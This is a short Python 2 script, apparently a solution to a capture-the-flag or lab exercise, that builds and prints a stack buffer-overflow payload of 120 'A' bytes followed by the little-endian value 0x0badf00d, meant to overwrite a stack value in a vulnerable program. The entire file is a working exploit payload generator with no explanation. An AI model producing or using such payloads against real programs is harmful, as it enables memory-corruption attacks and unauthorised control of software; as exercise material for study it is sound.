#!/usr/bin/python
import struct

#badfood = struct.pack("<I", 0x0badf00d)
badfood = "\x0d\xf0\xad\x0b"
s = 'A' * 120 + badfood

print s
